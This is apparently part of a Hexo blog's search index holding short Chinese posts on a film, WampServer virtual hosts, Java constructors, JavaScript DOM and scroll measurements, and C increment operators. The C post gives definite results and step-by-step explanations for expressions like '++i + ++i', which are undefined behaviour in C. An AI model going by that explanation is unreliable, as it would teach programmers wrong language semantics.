top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> anzhiyu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>流浪地球</title>
      <link href="/posts/liu-lang-di-qiu/"/>
      <url>/posts/liu-lang-di-qiu/</url>
      
        <content type="html"><![CDATA[<p>第二部不错，期待第三步！！</p><p><img src="https://imgbed.eamon.dpdns.org/file/1751279289846_%E6%B5%81%E6%B5%AA%E5%9C%B0%E7%90%83.webp" alt="流浪地球.webp"></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 电影 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wamp Server配置多站点</title>
      <link href="/posts/wamp-server-pei-zhi-duo-zhan-dian/"/>
      <url>/posts/wamp-server-pei-zhi-duo-zhan-dian/</url>
      
        <content type="html"><![CDATA[<p>先找到 需要修改的以下3个文件：</p><p>httpd.conf：D:\wamp\bin\apache\apache2.4.9\conf</p><p>httpd-vhosts：D:\wamp\bin\apache\apache2.4.9\conf\extra</p><p>hosts：C:\WINDOWS\System32\drivers\etc</p><span id="more"></span><p>1.修改 httpd.conf：(在文档中分别找到以下三句，把句首的注释符 ‘#’删掉)</p><p>LoadModule php5_module “d:&#x2F;wamp&#x2F;bin&#x2F;php&#x2F;php5.5.12&#x2F;php5apache2_4.dll”</p><p>PHPIniDir d:&#x2F;wamp&#x2F;bin&#x2F;php&#x2F;php5.5.12</p><p>Include conf&#x2F;extra&#x2F;httpd-vhosts.conf</p><p> </p><p> </p><p>2.修改 httpd-vhosts：</p><p>复制粘贴两个 以下模板</p><p>&lt;VirtualHost *:80&gt;<br>    ServerAdmin <a href="mailto:&#119;&#x65;&#98;&#x6d;&#x61;&#115;&#116;&#x65;&#x72;&#x40;&#100;&#117;&#109;&#x6d;&#121;&#x2d;&#x68;&#x6f;&#x73;&#116;&#x32;&#x2e;&#x65;&#x78;&#97;&#x6d;&#112;&#108;&#x65;&#46;&#99;&#111;&#109;">webmaster@dummy-host2.example.com</a><br>    DocumentRoot “c:&#x2F;Apache24&#x2F;docs&#x2F;dummy-host2.example.com”<br>    ServerName dummy-host2.example.com<br>    ErrorLog “logs&#x2F;dummy-host2.example.com-error.log”<br>    CustomLog “logs&#x2F;dummy-host2.example.com-access.log” common<br></VirtualHost></p><p>并修改其为：</p><p>&lt;VirtualHost *:80&gt;<br>    DocumentRoot  “D:&#x2F;wamp&#x2F;www&#x2F;demo&#x2F;site1”   &#x2F;&#x2F; 新站点，即site.com的根目录<br>    ServerName  localhost1.com      &#x2F;&#x2F; 新站点的域名<br>       &lt;Directory “e:&#x2F;PhpProject&#x2F;“&gt;<br>            Options Indexes FollowSymLinks<br>            AllowOverride all<br>            Require all granted<br>      </Directory><br></VirtualHost></p><p>&lt;VirtualHost *:80&gt;<br>    DocumentRoot  “D:&#x2F;wamp&#x2F;www&#x2F;demo&#x2F;site2”   <br>    ServerName  localhost2.com <br>       &lt;Directory “e:&#x2F;PhpProject&#x2F;“&gt;<br>            Options Indexes FollowSymLinks<br>            AllowOverride all<br>            Require all granted<br>      </Directory><br></VirtualHost></p><p> </p><p>。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。</p><p>为使 最初安装成功时 的localhost界面  继续生效(新建站点后，原来默认的localhost域名就会失效)：</p><p>在此还需要重新添加一个站点，</p><p>&lt;VirtualHost *:80&gt;<br>    DocumentRoot   “D:&#x2F;wamp&#x2F;www&#x2F;“    &#x2F;&#x2F; 此为wamp server 默认项目根目录<br>    ServerName   localhost<br></VirtualHost></p><p> </p><p> </p><p>还有一点！！！在我建好站 之后，再把所有的这些东西删掉 重启wamp server，3个站点都照样能正常工作。你们建站前先把它删掉试试！</p><p>   &lt;Directory “e:&#x2F;PhpProject&#x2F;“&gt;<br>            Options Indexes FollowSymLinks<br>            AllowOverride all<br>            Require all granted<br>      </Directory></p><p>3.修改 hosts(为新域名指定 127.0.0.1)：</p><p>这是win64位2.5版本wampserver的百度云链接：</p><p> <a href="https://pan.baidu.com/s/1llyy7yyJnrLvuGyskVVSsQ">https://pan.baidu.com/s/1llyy7yyJnrLvuGyskVVSsQ</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java Class中的构造方法</title>
      <link href="/posts/java-class-zhong-de-gou-zao-fang-fa/"/>
      <url>/posts/java-class-zhong-de-gou-zao-fang-fa/</url>
      
        <content type="html"><![CDATA[<h3 id="构造方法-初始化对象成员-时调用的方法。"><a href="#构造方法-初始化对象成员-时调用的方法。" class="headerlink" title="构造方法:初始化对象成员 时调用的方法。"></a>构造方法:初始化对象成员 时调用的方法。</h3><p>1.方法名 和 类名完全相同<br>2.在方法名的前面没有返回值类型的声明<br>3.在方法中不能使用return语句返回一个值<br>4.当没有指定构造方法时，系统会自动添加无参的构造方法<br>5.当有指定构造方法时，无论该构造方法是有参，还是无参，系统都不会再自动添加无参的构造方法<br>6.构造方法的重载：方法名相同，但参数不同的多个方法，调用时会自动根据不同的参数选择相应的方法<br>7.构造函数 不能被继承(子类默认先自动调用父类的 无参构造方法)</p><span id="more"></span><h3 id="无参的构造方法"><a href="#无参的构造方法" class="headerlink" title="无参的构造方法"></a>无参的构造方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Cat</span> <span class="variable">cat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cat</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Animal</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;动物&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Cat</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();<span class="comment">//有无均可，默认先调用父类构造方法</span></span><br><span class="line">        System.out.println(<span class="string">&quot;猫&quot;</span>);<span class="comment">//输出：动物 猫</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="有参的构造方法"><a href="#有参的构造方法" class="headerlink" title="有参的构造方法"></a>有参的构造方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Cat</span> <span class="variable">cat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cat</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Animal</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;动物name：&quot;</span>+name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Cat</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(<span class="string">&quot;喵星人&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;猫&quot;</span>);<span class="comment">//输出：动物name:喵星人    猫</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Js获取当前点击元素的索引</title>
      <link href="/posts/js-huo-qu-dang-qian-dian-ji-yuan-su-de-suo-yin/"/>
      <url>/posts/js-huo-qu-dang-qian-dian-ji-yuan-su-de-suo-yin/</url>
      
        <content type="html"><![CDATA[<p>以ul下的li元素为例；获取li的索引，代码如下：</p><p>&lt;ul id="list"&gt;<br>     &nbsp;&nbsp;&nbsp;&nbsp;&lt;li&gt;1&lt;/li&gt;<br>    &nbsp;&nbsp;&nbsp;&nbsp;&lt;li&gt;2&lt;/li&gt;<br>     &nbsp;&nbsp;&nbsp;&nbsp;&lt;li&gt;3&lt;/li&gt;<br>    &nbsp;&nbsp;&nbsp;&nbsp;&lt;li&gt;4&lt;/li&gt;<br>&lt;/ul&gt;</p><span id="more"></span><p>方法1：(自执行匿名函数法)</p><p>var ul &#x3D; document.getElementById(“list”);<br>var list &#x3D; ul.getElementsByTagName(‘li’);<br>for(var i&#x3D;0;i&lt;list.length;i++) {<br>  !function(j) {&#x2F;&#x2F; 匿名函数表达式1(j为该匿名函数形参)<br>     &#x2F;&#x2F; console.log(j); &#x2F;&#x2F;0,1,2,3<br>    list[j].onclick &#x3D; function() {&#x2F;&#x2F; 该匿名函数中 无参数！<br>       console.log(j); &#x2F;&#x2F; 点哪个输出哪个<br>      };<br>    }(i);&#x2F;&#x2F; 传入实参i,调用匿名函数<br>  }</p><p>方法2：(函数调用法)</p><p>function acti(ind) {<br>  list[ind].onclick &#x3D; function() {&#x2F;&#x2F; 该匿名函数中 无参数！<br>     console.log(ind); &#x2F;&#x2F; 点哪个输出哪个<br>  };<br>}<br>for(var i&#x3D;0;i&lt;list.length;i++) {<br>  acti(i);<br>}</p><p>方法3:(添加自定义属性index法)</p><p>把每个li元素加上自定义属性index,在li被点击时获取相应index属性即可</p><p>var ul &#x3D; document.getElementById(“list”);<br>var list &#x3D; ul.querySelectorAll(‘li’);<br>for (var i &#x3D; 0; i&lt;list.length; i++) {<br>   list[i].index &#x3D; i;&#x2F;&#x2F; 为每个li添加自定义属性并相应赋值<br>}<br>ul.addEventListener(‘click’,function(e){&#x2F;&#x2F; 为整个ul添加click<br>   console.log(e.target.index);&#x2F;&#x2F; 输出click target(即被点击的li) 对应的index值<br>})</p><p>方法4：(数组indexOf元素索引定位法)</p><p>获取ul下的所有li，找到被点击li在所有li中的位置</p><p>ul.addEventListener(‘click’,function(e){<br>   var item &#x3D; e.target;<br>   var listArr &#x3D; Array.from(list);<br>   console.log(listArr.indexOf(item));<br>})</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Js,jq获取 滚动条高度 及 浏览器宽高</title>
      <link href="/posts/js-jq-huo-qu-gun-dong-tiao-gao-du-ji-liu-lan-qi-kuan-gao/"/>
      <url>/posts/js-jq-huo-qu-gun-dong-tiao-gao-du-ji-liu-lan-qi-kuan-gao/</url>
      
        <content type="html"><![CDATA[<p>&#x2F;&#x2F; 获取 滚动条高度<br>console.log(window.scrollY);  <br>console.log(window.pageYOffset);<br>console.log(document.documentElement.scrollTop);  &#x2F;&#x2F; chrome下document.body.scrollTop值恒为0<br>console.log($(window).scrollTop());<br>console.log($(“html,body”).scrollTop());<br>console.log($(document).scrollTop());</p><span id="more"></span><p>&#x2F;&#x2F; 浏览器窗口可视区 宽度(不包含滚动条)<br>console.log(document.body.clientWidth);    &#x2F;&#x2F; document.documentElement<br>console.log($(document.body).width());    &#x2F;&#x2F;$(document.documentElement), $(“html,body”) 和 $(window)都可<br>console.log(window.innerWidth);  &#x2F;&#x2F; 包含滚动条!</p><p>&#x2F;&#x2F; 值会随窗口变窄而减小(数值未发现规律),但最终不会小于 最初设置的document宽<br>console.log($(document).width());</p><p> </p><p>&#x2F;&#x2F;浏览器可视区 高度(不包含滚动条)<br>console.log(document.documentElement.clientHeight);<br>console.log($(window).height());<br>console.log(window.innerHeight);</p><p>&#x2F;&#x2F; 最初document 的高度(即使js改变了文档宽高也无效)<br>console.log(document.body.clientHeight);<br>console.log($(document.body).height());    &#x2F;&#x2F; $(document.documentElement)和 $(“html,body”) </p><p>console.log(window.outerWidth);  &#x2F;&#x2F; Chrome测试发现比inner多14px,不知为何<br>alert(window.outerHeight);  &#x2F;&#x2F; 似乎不是浏览器高!</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言之自增探讨</title>
      <link href="/posts/c-yu-yan-zhi-zi-zeng-tan-tao/"/>
      <url>/posts/c-yu-yan-zhi-zi-zeng-tan-tao/</url>
      
        <content type="html"><![CDATA[<p>sum &#x3D; ++i + ++i的处理结果在 不同的编程语言（如java，js）及不同的编译器中可能有差异，以下仅针对C语言！纯粹个人理解，仅供参考。。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;                             </span><br><span class="line">    <span class="type">int</span> i=<span class="number">1</span>,sum;</span><br><span class="line"><span class="comment">/*  i = i++; //i=2 先赋值，再运算</span></span><br><span class="line"><span class="comment">    i = ++i; //i=2 先运算，再赋值</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;i=%d\n&quot;</span>,i); </span><br><span class="line"></span><br><span class="line"><span class="comment">/*注意：</span></span><br><span class="line"><span class="comment">a=++i; 等效为：i=i+1；a=i； </span></span><br><span class="line"><span class="comment">a=i++; 等效为：a=i；i=i+1；</span></span><br><span class="line"><span class="comment">sum=a+b;</span></span><br><span class="line"><span class="comment">a，b各自的 返回值 与 i值 不相关！</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//sum = ++i + ++i;</span></span><br><span class="line"><span class="comment">//6【未验证！左++i先自增为2暂不返回，右++i由i=2继续自增为3（i=3）完成 b=i 并返回，同时左++i也 完成 a=i 返回3结束。两者相加为6】</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//sum = i++ + ++i;</span></span><br><span class="line"><span class="comment">//4【左i++ 完成 a=i 先返回1结束，之后左i自增为2，右++i继续自增为3 完成 b=i 并返回3，结束，两者相加为4】</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//sum = i++ + i++;</span></span><br><span class="line"> <span class="comment">//2【左i++ 完成 a=i 先返回1结束，右i++ 完成 b=i 同时返回1结束，两者相加为2】</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//sum = ++i + i++; </span></span><br><span class="line"><span class="comment">//4【左++i先自增为2（i=2）暂不返回，右i++ 完成 b=i 直接返回2，左 同时返回2，结束，两者相加为4】</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    sum = i++; //sum=1 ,i=2</span></span><br><span class="line"><span class="comment">    sum = ++i; //sum=2 ,i=2</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">   <span class="comment">//printf(&quot;sum=%d\n,i=%d\n&quot;,sum,i);  </span></span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><h2 id="要点："><a href="#要点：" class="headerlink" title="要点："></a>要点：</h2><ol><li>++i是先运算，再赋值。i++是先赋值，再运算！</li><li>完成 赋值表达式 便 返回值，与 i值 不相关！</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sum = i++; <span class="comment">//sum=1 ,i=2</span></span><br><span class="line">sum = ++i; <span class="comment">//sum=2 ,i=2</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;sum=%d\n,i=%d\n&quot;</span>,sum,i);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
